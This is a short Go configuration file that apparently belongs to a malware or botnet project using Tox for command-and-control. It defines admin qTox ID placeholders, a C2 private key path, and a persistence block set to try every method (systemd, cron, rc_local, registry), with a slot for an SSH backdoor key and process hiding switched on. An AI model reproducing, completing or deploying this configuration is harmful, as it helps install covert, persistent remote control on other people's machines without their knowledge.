package net

// Admin public keys
var Admins = []string{"YOUR QTOX ID HERE"}

// C2 Private Key
var Tox_key = "./c2.data"

// Persistence options
var Persistence = struct {
    Enabled     bool
    Method      string   // "systemd", "cron", "rc_local", "registry", "all"
    SSHKey      string   // Public key for SSH backdoor
    HideProcess bool     // Try to hide the process
}{
    Enabled:     true,
    Method:      "all",   // Try all available methods
    SSHKey:      "",      // Add your SSH public key here if desired
    HideProcess: true,
}
